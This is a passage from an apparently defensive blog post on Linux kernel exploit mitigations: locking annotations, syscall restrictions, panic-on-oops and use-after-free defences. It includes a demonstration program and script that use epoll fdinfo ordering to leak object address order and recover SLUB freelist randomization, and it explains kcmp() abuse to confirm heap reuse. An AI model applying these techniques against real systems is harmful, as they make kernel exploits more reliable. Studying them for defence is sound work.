__attribute__((guarded_by(mutex)));&lt;br /&gt;  9     struct mutex mutex;&lt;br /&gt; 10 };&lt;br /&gt; 11 &lt;br /&gt; 12 int good(struct foo *p1, struct foo *p2) {&lt;br /&gt; 13     lock_mutex(&amp;amp;p1-&amp;gt;mutex);&lt;br /&gt; 14     int result = p1-&amp;gt;a;&lt;br /&gt; 15     unlock_mutex(&amp;amp;p1-&amp;gt;mutex);&lt;br /&gt; 16     return result;&lt;br /&gt; 17 }&lt;br /&gt; 18 &lt;br /&gt; 19 int bogus(struct foo *p1, struct foo *p2) {&lt;br /&gt; 20     lock_mutex(&amp;amp;p1-&amp;gt;mutex);&lt;br /&gt; 21     int result = p2-&amp;gt;a;&lt;br /&gt; 22     unlock_mutex(&amp;amp;p1-&amp;gt;mutex);&lt;br /&gt; 23     return result;&lt;br /&gt; 24 }&lt;br /&gt;$ clang++ -c -o thread-safety-test.o thread-safety-test.cpp -Wall -Wthread-safety&lt;br /&gt;thread-safety-test.cpp:21:22: warning: reading variable 'a' requires holding mutex 'p2-&amp;gt;mutex' [-Wthread-safety-precise]&lt;br /&gt;    int result = p2-&amp;gt;a;&lt;br /&gt;                     ^&lt;br /&gt;thread-safety-test.cpp:21:22: note: found near match 'p1-&amp;gt;mutex'&lt;br /&gt;1 warning generated.&lt;br /&gt;$ &lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, this does not currently work when compiling as C code because the &lt;code&gt;guarded_by&lt;/code&gt; attribute can't find the other struct member; it seems to have been designed mostly for use in C++ code. A more fundamental problem is that it also doesn't appear to have built-in support for distinguishing the different rules for accessing a struct member depending on the lifetime state of the object. For example, almost all objects with locked members will have initialization/destruction functions that have exclusive access to the entire object and can access members without locking. (The lock might not even be initialized in those states.)&lt;/p&gt;&lt;p&gt;Some objects also have more lifetime states; in particular, for many objects with RCU-managed lifetime, only a subset of the members may be accessed through an RCU reference without having upgraded the reference to a refcounted one beforehand. Perhaps this could be addressed by introducing a new type attribute that can be used to mark pointers to structs in special lifetime states? (For C++ code, Clang's Thread Safety Analysis simply disables all checks in all constructor/destructor functions.)&lt;/p&gt;&lt;p&gt;I am hopeful that, with some extensions, something vaguely like Clang's Thread Safety Analysis could be used to retrofit some level of compile-time safety against unintended data races. This will require adding a lot of annotations, in particular to headers, to document intended locking semantics; but such annotations are probably anyway necessary to enable productive work on a complex codebase. In my experience, when there are no detailed comments/annotations on locking rules, every attempt to change a piece of code you're not intimately familiar with (without introducing horrible memory safety bugs) turns into a foray into the thicket of the surrounding call graphs, trying to unravel the intentions behind the code.&lt;/p&gt;&lt;p&gt;The one big downside is that this requires getting the development community for the codebase on board with the idea of backfilling and maintaining such annotations. And someone has to write the analysis tooling that can verify the annotations.&lt;/p&gt;&lt;p&gt;At the moment, the Linux kernel does have some very coarse locking validation via &lt;code&gt;sparse&lt;/code&gt;; but this infrastructure is not capable of detecting situations where the wrong lock is used or validating that a struct member is protected by a lock. It also can't properly deal with things like conditional locking, which makes it hard to use for anything other than spinlocks/RCU. The kernel's runtime locking validation via &lt;code&gt;LOCKDEP&lt;/code&gt; is more advanced, but mostly with a focus on locking correctness of RCU pointers as well as deadlock detection (the main focus); again, there is no mechanism to, for example,automatically validate that a given struct member is only accessed under a specific lock (which would probably also be quite costly to implement with runtime validation). Also, as a runtime validation mechanism, it can't discover errors in code that isn't executed during testing (although it can combine separately observed behavior into race scenarios without ever actually observing the race).&lt;/p&gt;&lt;h2&gt;Against bugs in source code: Global static locking analysis&lt;/h2&gt;&lt;p&gt;An alternative approach to checking memory safety rules at compile time is to do it either after the entire codebase has been compiled, or with an external tool that analyzes the entire codebase. This allows the analysis tooling to perform analysis across compilation units, reducing the amount of information that needs to be made explicit in headers. This may be a more viable approach if peppering annotations everywhere across headers isn't viable; but it also reduces the utility to human readers of the code, unless the inferred semantics are made visible to them through some special code viewer. It might also be less ergonomic in the long run if changes to one part of the kernel could make the verification of other parts fail - especially if those failures only show up in some configurations.&lt;/p&gt;&lt;p&gt;I think global static analysis is probably a good tool for finding some subsets of bugs, and it might also help with finding the worst-case depth of kernel stacks or proving the absence of deadlocks, but it's probably less suited for proving memory safety correctness?&lt;/p&gt;&lt;h2&gt;Against exploit primitives: Attack primitive reduction via syscall restrictions&lt;/h2&gt;&lt;p&gt;(Yes, I made up that name because I thought that capturing this under "Attack surface reduction" is too muddy.)&lt;/p&gt;&lt;p&gt;Because allocator fastpaths (both in SLUB and in the page allocator) are implemented using per-CPU data structures, the ease and reliability of exploits that want to coax the kernel's memory allocators into reallocating memory in specific ways can be improved if the attacker has fine-grained control over the assignment of exploit threads to CPU cores. I'm calling such a capability, which provides a way to facilitate exploitation by influencing relevant system state/behavior, an "attack primitive" here. Luckily for us, Linux allows tasks to pin themselves to specific CPU cores without requiring any privilege using the &lt;code&gt;sched_setaffinity()&lt;/code&gt; syscall.&lt;/p&gt;&lt;p&gt;(As a different example, one primitive that can provide an attacker with fairly powerful capabilities is being able to indefinitely stall kernel faults on userspace addresses via &lt;a href="https://googleprojectzero.blogspot.com/2016/06/exploiting-recursion-in-linux-kernel_20.html#:~:text=pause%20the%20kernel%20thread"&gt;FUSE&lt;/a&gt; or userfaultfd.)&lt;/p&gt;&lt;p&gt;Just like in the section "Attack surface reduction" above, an attacker's ability to use these primitives can be reduced by filtering syscalls; but while the mechanism and the compatibility concerns are similar, the rest is fairly different:&lt;/p&gt;&lt;p&gt;Attack primitive reduction does not normally reliably prevent a bug from being exploited; and an attacker will sometimes even be able to obtain a similar but shoddier (more complicated, less reliable, less generic, ...) primitive indirectly, for example:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Instead of &lt;code&gt;sched_setaffinity()&lt;/code&gt;, an attacker could attempt to launch several threads, let them poll &lt;code&gt;getcpu()&lt;/code&gt; to figure out which cores they're running on, and then dispatch work to the threads as appropriate.&lt;/li&gt;&lt;li&gt;Instead of delaying page faults with FUSE or userfaultfd, &lt;a href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf#page=30"&gt;an attacker may be able to abuse discontiguous file mappings and scheduler behavior&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Attack surface reduction is about limiting access to code that is suspected to contain exploitable bugs; in a codebase written in a memory-unsafe language, that tends to apply to pretty much the entire codebase. Attack surface reduction is often fairly opportunistic: You permit the things you need, and deny the rest by default.&lt;/p&gt;&lt;p&gt;Attack primitive reduction limits access to code that is suspected or known to provide (sometimes very specific) exploitation primitives. For example, one might decide to specifically forbid access to FUSE and userfaultfd for most code because of their utility for kernel exploitation, and, if one of those interfaces is truly needed, design a workaround that avoids exposing the attack primitive to userspace. This is different from attack surface reduction, where it often makes sense to permit access to any feature that a legitimate workload wants to use.&lt;/p&gt;&lt;p&gt;A nice example of an attack primitive reduction is the sysctl &lt;code&gt;vm.unprivileged_userfaultfd&lt;/code&gt;, &lt;a href="https://git.kernel.org/linus/cefdca0a86be"&gt;which was first introduced&lt;/a&gt; so that userfaultfd can be made completely inaccessible to normal users and &lt;a href="https://git.kernel.org/linus/d0d4730ac2e4"&gt;was then later adjusted&lt;/a&gt; so that users can be granted access to part of its functionality without gaining the dangerous attack primitive.  (But if you can create unprivileged user namespaces, &lt;a href="https://twitter.com/tehjh/status/1438330352075001856"&gt;you can still use FUSE&lt;/a&gt; to get an equivalent effect.)&lt;/p&gt;&lt;p&gt;When maintaining lists of allowed syscalls for a sandboxed system component, or something along those lines, it may be a good idea to explicitly track which syscalls are explicitly forbidden for attack primitive reduction reasons, or similarly strong reasons - otherwise one might accidentally end up permitting them in the future. (I guess that's kind of similar to issues that one can run into when maintaining ACLs...)&lt;/p&gt;&lt;p&gt;But like in the previous section, attack primitive reduction also tends to rely on making some functionality unavailable, and so it might not be viable in all situations. For example, newer versions of Android deliberately indirectly give apps access to FUSE through &lt;a href="https://developer.android.com/reference/android/os/storage/StorageManager#openProxyFileDescriptor(int,%20android.os.ProxyFileDescriptorCallback,%20android.os.Handler)"&gt;the AppFuse mechanism&lt;/a&gt;. (That API doesn't actually give an app direct access to &lt;code&gt;/dev/fuse&lt;/code&gt;, but it does forward read/write requests to the app.)&lt;/p&gt;&lt;h2&gt;Against oops-based oracles: Lockout or panic on crash&lt;/h2&gt;&lt;p&gt;The ability to recover from kernel oopses in an exploit can help an attacker compensate for a lack of information about system state. Under some circumstances, it can even serve as a binary oracle that can be used to more or less perform a binary search for a value, or something like that.&lt;/p&gt;&lt;p&gt;(&lt;a href="https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html"&gt;It used to be even worse on some distributions&lt;/a&gt;, where &lt;code&gt;dmesg&lt;/code&gt; was accessible for unprivileged users; so if you managed to trigger an oops or &lt;code&gt;WARN&lt;/code&gt;, you could then grab the register states at all IRET frames in the kernel stack, which &lt;a href="https://googleprojectzero.blogspot.com/2018/09/a-cache-invalidation-bug-in-linux.html#:~:text=Leaking%20pointers%20from%20dmesg"&gt;could be used to leak things like kernel pointers&lt;/a&gt;. Luckily nowadays most distributions, including &lt;a href="https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/groovy/commit/?id=f2fac7568f6acdb37de0696717f23dedc02fbe48"&gt;Ubuntu 20.10&lt;/a&gt;, restrict &lt;code&gt;dmesg&lt;/code&gt; access.)&lt;/p&gt;&lt;p&gt;Android and Chrome OS nowadays set the kernel's &lt;code&gt;panic_on_oops&lt;/code&gt; flag, meaning the machine will immediately restart when a kernel oops happens. This makes it hard to use oopsing as part of an exploit, and arguably also makes more sense from a reliability standpoint - the system will be down for a bit, and it will lose its existing state, but it will also reset into a known-good state instead of continuing in a potentially half-broken state, especially if the crashing thread was holding mutexes that can never again be released, or things like that. On the other hand, if some service crashes on a desktop system, perhaps that shouldn't cause the whole system to immediately go down and make you lose unsaved state - so &lt;code&gt;panic_on_oops&lt;/code&gt; might be too drastic there.&lt;/p&gt;&lt;p&gt;A good solution to this might require a more fine-grained approach. (For example, grsecurity has for a long time had the ability to lock out specific UIDs that have caused crashes.) Perhaps it would make sense to allow the &lt;code&gt;init&lt;/code&gt; daemon to use different policies for crashes in different services/sessions/UIDs?&lt;/p&gt;&lt;h2&gt;Against UAF access: Deterministic UAF mitigation&lt;/h2&gt;&lt;p&gt;One defense that would reliably stop an exploit for this issue would be a deterministic use-after-free mitigation. Such a mitigation would reliably protect the memory formerly occupied by the object from accesses through dangling pointers to the object, at least once the memory has been reused for a different purpose (including reuse to store heap metadata). For write operations, this probably requires either atomicity of the access check and the actual write or an RCU-like delayed freeing mechanism. For simple read operations, it can also be implemented by ordering the access check after the read, but before the read value is used.&lt;/p&gt;&lt;p&gt;A big downside of this approach on its own is that extra checks on every memory access will probably come with an extremely high efficiency penalty, especially if the mitigation can not make any assumptions about what kinds of parallel accesses might be happening to an object, or what semantics pointers have. (The proof-of-concept implementation I presented at LSSNA 2020 (&lt;a href="https://static.sched.com/hosted_files/lssna2020/0b/LSSNA_2020_Jann_Horn_UAF_Mitigation.pdf"&gt;slides&lt;/a&gt;, &lt;a href="https://www.youtube.com/watch?v=uE1w0Mxldwk"&gt;recording&lt;/a&gt;) had CPU overhead roughly in the range 60%-159% in kernel-heavy benchmarks, and ~8% for a very userspace-heavy benchmark.)&lt;/p&gt;&lt;p&gt;Unfortunately, even a deterministic use-after-free mitigation often won't be enough to deterministically limit the blast radius of something like a refcounting mistake to the object in which it occurred. Consider a case where two codepaths concurrently operate on the same object: Codepath A assumes that the object is live and subject to normal locking rules. Codepath B knows that the reference count reached zero, assumes that it therefore has exclusive access to the object (meaning all members are mutable without any locking requirements), and is trying to tear down the object. Codepath B might then start dropping references the object was holding on other objects while codepath A is following the same references. This could then lead to use-after-frees on pointed-to objects. If all data structures are subject to the same mitigation, this might not be too much of a problem; but if some data structures (like &lt;code&gt;struct page&lt;/code&gt;) are not protected, it might permit a mitigation bypass.&lt;/p&gt;&lt;p&gt;Similar issues apply to data structures with &lt;code&gt;union&lt;/code&gt; members that are used in different object states; for example, here's some random kernel data structure with an &lt;code&gt;rcu_head&lt;/code&gt; in a &lt;code&gt;union&lt;/code&gt; (just a random example, there isn't anything wrong with this code as far as I know):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;struct allowedips_node {&lt;br /&gt;    struct wg_peer __rcu *peer;&lt;br /&gt;    struct allowedips_node __rcu *bit[2];&lt;br /&gt;    /* While it may seem scandalous that we waste space for v4,&lt;br /&gt;     * we're alloc'ing to the nearest power of 2 anyway, so this&lt;br /&gt;     * doesn't actually make a difference.&lt;br /&gt;     */&lt;br /&gt;    u8 bits[16] __aligned(__alignof(u64));&lt;br /&gt;    u8 cidr, bit_at_a, bit_at_b, bitlen;&lt;br /&gt;&lt;br /&gt;    /* Keep rarely used list at bottom to be beyond cache line. */&lt;br /&gt;    union {&lt;br /&gt;        struct list_head peer_list;&lt;br /&gt;        struct rcu_head rcu;&lt;br /&gt;    };&lt;br /&gt;};&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As long as everything is working properly, the &lt;code&gt;peer_list&lt;/code&gt; member is only used while the object is live, and the &lt;code&gt;rcu&lt;/code&gt; member is only used after the object has been scheduled for delayed freeing; so this code is completely fine. But &lt;em&gt;if&lt;/em&gt; a bug somehow caused the &lt;code&gt;peer_list&lt;/code&gt; to be read after the &lt;code&gt;rcu&lt;/code&gt; member has been initialized, type confusion would result.&lt;/p&gt;&lt;p&gt;In my opinion, this demonstrates that while UAF mitigations do have a lot of value (and would have reliably prevented exploitation of this specific bug), &lt;strong&gt;a use-after-free is just one possible consequence of the symptom class "object state confusion"&lt;/strong&gt; (which may or may not be the same as the bug class of the root cause). It would be even better to enforce rules on object states, and ensure that an object e.g. can't be accessed through a "refcounted" reference anymore after the refcount has reached zero and has logically transitioned into a state like "non-RCU members are exclusively owned by thread performing teardown" or "RCU callback pending, non-RCU members are uninitialized" or "exclusive access to RCU-protected members granted to thread performing teardown, other members are uninitialized". Of course, doing this as a runtime mitigation would be even costlier and messier than a reliable UAF mitigation; this level of protection is probably only realistic with at least some level of annotations and static validation.&lt;/p&gt;&lt;h2&gt;Against UAF access: Probabilistic UAF mitigation; pointer leaks&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Summary: Some types of probabilistic UAF mitigation break if the attacker can leak information about pointer values; and information about pointer values easily leaks to userspace, e.g. through pointer comparisons in map/set-like structures.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;If a deterministic UAF mitigation is too costly, an alternative is to do it probabilistically; for example, by tagging pointers with a small number of bits that are checked against object metadata on access, and then changing that object metadata when objects are freed.&lt;/p&gt;&lt;p&gt;The downside of this approach is that information leaks can be used to break the protection. One example of a type of information leak that I'd like to highlight (without any judgment on the relative importance of this compared to other types of information leaks) are intentional pointer comparisons, which have quite a few facets.&lt;/p&gt;&lt;p&gt;A relatively straightforward example where this could be an issue is the &lt;a href="https://man7.org/linux/man-pages/man2/kcmp.2.html"&gt;&lt;code&gt;kcmp()&lt;/code&gt;&lt;/a&gt; syscall. This syscall compares two kernel objects using an arithmetic comparison of their permuted pointers (using a per-boot randomized permutation, see &lt;code&gt;kptr_obfuscate()&lt;/code&gt;) and returns the result of the comparison (smaller, equal or greater). This gives userspace a way to order handles to kernel objects (e.g. file descriptors) based on the identities of those kernel objects (e.g. &lt;code&gt;struct file&lt;/code&gt; instances), which in turn allows userspace to group a set of such handles by backing kernel object in &lt;code&gt;O(n*log(n))&lt;/code&gt; time using a standard sorting algorithm.&lt;/p&gt;&lt;p&gt;This syscall can be abused for improving the reliability of use-after-free exploits against some struct types because it checks whether two pointers to kernel objects are equal without accessing those objects: An attacker can allocate an object, somehow create a reference to the object that is not counted properly, free the object, reallocate it, and then verify whether the reallocation indeed reused the same address by comparing the dangling reference and a reference to the new object with &lt;code&gt;kcmp()&lt;/code&gt;. If &lt;code&gt;kcmp()&lt;/code&gt; includes the pointer's tag bits in the comparison, this would likely also permit breaking probabilistic UAF mitigations.&lt;/p&gt;&lt;p&gt;Essentially the same concern applies when a kernel pointer is encrypted and then given to userspace in &lt;code&gt;fuse_lock_owner_id()&lt;/code&gt;, which encrypts the pointer to a &lt;code&gt;files_struct&lt;/code&gt; with an open-coded version of &lt;a href="https://en.wikipedia.org/wiki/XTEA"&gt;XTEA&lt;/a&gt; before passing it to a FUSE daemon.&lt;/p&gt;&lt;p&gt;In both these cases, explicitly stripping tag bits would be an acceptable workaround because a pointer without tag bits still uniquely identifies a memory location; and given that these are very special interfaces that intentionally expose some degree of information about kernel pointers to userspace, it would be reasonable to adjust this code manually.&lt;/p&gt;&lt;p&gt;A somewhat more interesting example is the behavior of this piece of userspace code:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#define _GNU_SOURCE&lt;br /&gt;#include &amp;lt;sys/epoll.h&amp;gt;&lt;br /&gt;#include &amp;lt;sys/eventfd.h&amp;gt;&lt;br /&gt;#include &amp;lt;sys/resource.h&amp;gt;&lt;br /&gt;#include &amp;lt;err.h&amp;gt;&lt;br /&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br /&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;br /&gt;#include &amp;lt;unistd.h&amp;gt;&lt;br /&gt;#include &amp;lt;sched.h&amp;gt;&lt;br /&gt;&lt;br /&gt;#define SYSCHK(x) ({          \&lt;br /&gt;  typeof(x) __res = (x);      \&lt;br /&gt;  if (__res == (typeof(x))-1) \&lt;br /&gt;    err(1, "SYSCHK(" #x ")"); \&lt;br /&gt;  __res;                      \&lt;br /&gt;})&lt;br /&gt;&lt;br /&gt;int main(void) {&lt;br /&gt;  struct rlimit rlim;&lt;br /&gt;  SYSCHK(getrlimit(RLIMIT_NOFILE, &amp;amp;rlim));&lt;br /&gt;  rlim.rlim_cur = rlim.rlim_max;&lt;br /&gt;  SYSCHK(setrlimit(RLIMIT_NOFILE, &amp;amp;rlim));&lt;br /&gt;&lt;br /&gt;  cpu_set_t cpuset;&lt;br /&gt;  CPU_ZERO(&amp;amp;cpuset);&lt;br /&gt;  CPU_SET(0, &amp;amp;cpuset);&lt;br /&gt;  SYSCHK(sched_setaffinity(0, sizeof(cpuset), &amp;amp;cpuset));&lt;br /&gt;&lt;br /&gt;  int epfd = SYSCHK(epoll_create1(0));&lt;br /&gt;  for (int i=0; i&amp;lt;1000; i++)&lt;br /&gt;    SYSCHK(eventfd(0, 0));&lt;br /&gt;  for (int i=0; i&amp;lt;192; i++) {&lt;br /&gt;    int fd = SYSCHK(eventfd(0, 0));&lt;br /&gt;    struct epoll_event event = {&lt;br /&gt;      .events = EPOLLIN,&lt;br /&gt;      .data = { .u64 = i }&lt;br /&gt;    };&lt;br /&gt;    SYSCHK(epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;amp;event));&lt;br /&gt;  }&lt;br /&gt;&lt;br /&gt;  char cmd[100];&lt;br /&gt;  sprintf(cmd, "cat /proc/%d/fdinfo/%d", getpid(), epfd);&lt;br /&gt;  system(cmd);&lt;br /&gt;}&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It first creates a ton of eventfds that aren't used. Then it creates a bunch more eventfds and creates epoll watches for them, in creation order, with a monotonically incrementing counter in the "data" field. Afterwards, it asks the kernel to print the current state of the epoll instance, which comes with a list of all registered epoll watches, including the value of the &lt;code&gt;data&lt;/code&gt; member (in hex). But how is this list sorted? Here's the result of running that code in a Ubuntu 20.10 VM (truncated, because it's a bit long):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;user@ubuntuvm:~/epoll_fdinfo$ ./epoll_fdinfo &lt;br /&gt;pos:    0&lt;br /&gt;flags:  02&lt;br /&gt;mnt_id: 14&lt;br /&gt;tfd:     1040 events:       19 data:               24  pos:0 ino:2f9a sdev:d&lt;br /&gt;tfd:     1050 events:       19 data:               2e  pos:0 ino:2f9a sdev:d&lt;br /&gt;tfd:     1024 events:       19 data:               14  pos:0 ino:2f9a sdev:d&lt;br /&gt;tfd:     1029 events:       19 data:               19  pos:0 ino:2f9a sdev:d&lt;br /&gt;tfd:     1048 events:       19 data:               2c  pos:0 ino:2f9a sdev:d&lt;br /&gt;tfd:     1042 events:       19 data:               26  pos:0 ino:2f9a sdev:d&lt;br /&gt;tfd:     1026 events:       19 data:               16  pos:0 ino:2f9a sdev:d&lt;br /&gt;tfd:     1033 events:       19 data:               1d  pos:0 ino:2f9a sdev:d&lt;br /&gt;[...]&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;data:&lt;/code&gt; field here is the loop index we stored in the &lt;code&gt;.data&lt;/code&gt; member, formatted as hex. Here is the complete list of the &lt;code&gt;data&lt;/code&gt; values in decimal:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19, 95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110, 12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10, 135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118, 66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81, 177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160, 186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;While these look sort of random, you can see that the list can be split into blocks of length 32 that consist of shuffled contiguous sequences of numbers:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Block 1 (32 values in range 19-50):&lt;br /&gt;36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19&lt;br /&gt;&lt;br /&gt;Block 2 (32 values in range 83-114):&lt;br /&gt;95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110&lt;br /&gt;&lt;br /&gt;Block 3 (19 values in range 0-18):&lt;br /&gt;12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10&lt;br /&gt;&lt;br /&gt;Block 4 (32 values in range 115-146):&lt;br /&gt;135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118&lt;br /&gt;&lt;br /&gt;Block 5 (32 values in range 51-82):&lt;br /&gt;66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81&lt;br /&gt;&lt;br /&gt;Block 6 (32 values in range 147-178):&lt;br /&gt;177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160&lt;br /&gt;&lt;br /&gt;Block 7 (13 values in range 179-191):&lt;br /&gt;186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What's going on here becomes clear when you look at the data structures &lt;code&gt;epoll&lt;/code&gt; uses internally. &lt;code&gt;ep_insert&lt;/code&gt; calls &lt;code&gt;ep_rbtree_insert&lt;/code&gt; to insert a &lt;code&gt;struct epitem&lt;/code&gt; into a red-black tree (a type of sorted binary tree); and this red-black tree is sorted using a tuple of a &lt;code&gt;struct file *&lt;/code&gt; and a file descriptor number:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;/* Compare RB tree keys */&lt;br /&gt;static inline int ep_cmp_ffd(struct epoll_filefd *p1,&lt;br /&gt;                             struct epoll_filefd *p2)&lt;br /&gt;{&lt;br /&gt;        return (p1-&amp;gt;file &amp;gt; p2-&amp;gt;file ? +1:&lt;br /&gt;                (p1-&amp;gt;file &amp;lt; p2-&amp;gt;file ? -1 : p1-&amp;gt;fd - p2-&amp;gt;fd));&lt;br /&gt;}&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So the values we're seeing have been ordered based on the virtual address of the corresponding &lt;code&gt;struct file&lt;/code&gt;; and SLUB allocates &lt;code&gt;struct file&lt;/code&gt; from order-1 pages (i.e. pages of size 8 KiB), which can hold 32 objects each:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@ubuntuvm:/sys/kernel/slab/filp# cat order &lt;br /&gt;1&lt;br /&gt;root@ubuntuvm:/sys/kernel/slab/filp# cat objs_per_slab &lt;br /&gt;32&lt;br /&gt;root@ubuntuvm:/sys/kernel/slab/filp# &lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This explains the grouping of the numbers we saw: Each block of 32 contiguous values corresponds to an order-1 page that was previously empty and is used by SLUB to allocate objects until it becomes full.&lt;/p&gt;&lt;p&gt;With that knowledge, we can transform those numbers a bit, to show the order in which objects were allocated inside each page (excluding pages for which we haven't seen all allocations):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;$ cat slub_demo.py &lt;br /&gt;#!/usr/bin/env python3&lt;br /&gt;blocks = [&lt;br /&gt;  [ 36, 46, 20, 25, 44, 38, 22, 29, 30, 45, 33, 28, 41, 31, 23, 37, 24, 50, 32, 26, 21, 43, 35, 48, 27, 39, 40, 47, 42, 34, 49, 19 ],&lt;br /&gt;  [ 95, 105, 111, 84, 103, 97, 113, 88, 89, 104, 92, 87, 100, 90, 114, 96, 83, 109, 91, 85, 112, 102, 94, 107, 86, 98, 99, 106, 101, 93, 108, 110 ],&lt;br /&gt;  [ 12, 1, 14, 5, 6, 9, 4, 17, 7, 13, 0, 8, 2, 11, 3, 15, 16, 18, 10 ],&lt;br /&gt;  [ 135, 145, 119, 124, 143, 137, 121, 128, 129, 144, 132, 127, 140, 130, 122, 136, 123, 117, 131, 125, 120, 142, 134, 115, 126, 138, 139, 146, 141, 133, 116, 118 ],&lt;br /&gt;  [ 66, 76, 82, 55, 74, 68, 52, 59, 60, 75, 63, 58, 71, 61, 53, 67, 54, 80, 62, 56, 51, 73, 65, 78, 57, 69, 70, 77, 72, 64, 79, 81 ],&lt;br /&gt;  [ 177, 155, 161, 166, 153, 147, 163, 170, 171, 154, 174, 169, 150, 172, 164, 178, 165, 159, 173, 167, 162, 152, 176, 157, 168, 148, 149, 156, 151, 175, 158, 160 ],&lt;br /&gt;  [ 186, 188, 179, 180, 183, 191, 181, 187, 182, 185, 189, 190, 184 ]&lt;br /&gt;]&lt;br /&gt;&lt;br /&gt;for alloc_indices in blocks:&lt;br /&gt;  if len(alloc_indices) != 32:&lt;br /&gt;    continue&lt;br /&gt;  # indices of allocations ('data'), sorted by memory location, shifted to be relative to the block&lt;br /&gt;  alloc_indices_relative = [position - min(alloc_indices) for position in alloc_indices]&lt;br /&gt;  # reverse mapping: memory locations of allocations,&lt;br /&gt;  # sorted by index of allocation ('data').&lt;br /&gt;  # if we've observed all allocations in a page,&lt;br /&gt;  # these will really be indices into the page.&lt;br /&gt;  memory_location_by_index = [alloc_indices_relative.index(idx) for idx in range(0, len(alloc_indices))]&lt;br /&gt;  print(memory_location_by_index)&lt;br /&gt;$ ./slub_demo.py &lt;br /&gt;[31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17]&lt;br /&gt;[16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2, 20, 6, 14]&lt;br /&gt;[23, 30, 17, 31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27]&lt;br /&gt;[20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15, 5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2]&lt;br /&gt;[5, 25, 26, 12, 28, 21, 4, 9, 1, 27, 23, 30, 17, 31, 2, 20, 6, 14, 16, 3, 19, 24, 11, 7, 8, 13, 18, 10, 29, 22, 0, 15]&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And these sequences are almost the same, except that they have been rotated around by different amounts. This is exactly the SLUB freelist randomization scheme, as introduced in &lt;a href="https://git.kernel.org/linus/210e7a43fa905"&gt;commit 210e7a43fa905&lt;/a&gt;!&lt;/p&gt;&lt;p&gt;When a SLUB &lt;code&gt;kmem_cache&lt;/code&gt; is created (an instance of the SLUB allocator for a specific size class and potentially other specific attributes, usually initialized at boot time), &lt;code&gt;init_cache_random_seq&lt;/code&gt; and &lt;code&gt;cache_random_seq_create&lt;/code&gt; fill an array 